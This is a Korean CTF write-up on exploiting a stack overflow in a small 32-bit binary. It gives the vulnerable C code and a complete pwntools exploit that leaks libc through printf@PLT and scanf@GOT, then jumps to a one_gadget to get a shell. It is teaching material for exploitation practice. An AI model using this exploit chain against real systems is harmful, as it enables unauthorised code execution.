---
title: "One-Shot Gadget (one_gadget) 활용 예시"
date: "2023-08-27"
description: "one_gadget을 이용한 libc leak → one-shot RCE 풀이 예시 — printf@PLT로 scanf@GOT 릭 후 one_gadget 점프"
tags: ["pwn", "rop", "one-gadget", "aslr", "libc", "linux"]
platform: "ctf"
category: "redteam"
difficulty: "Easy"
authors:
  - name: "Ph4nt0m"
    link: "https://github.com/Phantomn"
---

## 바이너리 정보

```
vuln: ELF 32-bit LSB executable
Arch:  i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX:    NX enabled
PIE:   No PIE (0x8048000)
ASLR:  On
```

## 취약 코드

```c
#include <stdio.h>

void getMessage() {
    char msg[200];
    printf("Enter message: ");
    scanf("%s", msg);
    printf("The message has been received.");
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    getMessage();
    return 0;
}
```

`msg[200]`에 `scanf("%s")`로 입력을 받으므로 스택 버퍼 오버플로우가 발생한다. NX로 쉘코드 실행은 불가하고 ASLR이 활성화되어 있어 libc 주소 릭이 필요하다.

## 풀이 전략

1. `printf@PLT`로 `scanf@GOT`를 출력해 libc 주소를 릭
2. 릭된 주소에서 libc base를 계산
3. `one_gadget` 오프셋으로 점프

## 익스플로잇

```python
from pwn import *

p = process("./vuln")
e = ELF("./vuln")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.arch = 'i386'

printf_plt = e.plt['printf']          # 0x8049080
scanf_got  = e.got['__isoc99_scanf']  # 0x804c018
getMessage = e.symbols['getMessage']
scanf_offset = libc.symbols['__isoc99_scanf']
oneshot = 0x1487fb
pr_eax_offset = 0x2c2d2
pr_ebp_offset = 0x1e973
got_offset    = 0x1eb000

# Stage 1: libc leak via printf(scanf@GOT)
payload  = b"A" * 212
payload += p32(printf_plt)
payload += p32(getMessage)   # return to getMessage for stage 2
payload += p32(scanf_got)

p.recvuntil("Enter message: ")
p.sendline(payload)
p.recvuntil("received.")
leak = u32(p.recv(4))

libc_base = leak - scanf_offset
one = libc_base + oneshot

# Stage 2: one_gadget
payload2  = b"A" * 212
payload2 += p32(libc_base + pr_eax_offset)
payload2 += p32(0x0)
payload2 += p32(libc_base + pr_ebp_offset)
payload2 += p32(libc_base + got_offset)
payload2 += p32(one)

p.recvuntil("Enter message: ")
p.sendline(payload2)
p.interactive()
```

## 핵심 포인트

- `printf@PLT`로 GOT 주소를 출력해 libc leak → `scanf@GOT - scanf_offset = libc_base`
- `one_gadget` 조건 충족을 위해 `eax=0`, `ebp` 정렬이 필요할 수 있다
- 반환 주소로 `getMessage`를 재사용해 Stage 2에서 one_gadget으로 점프
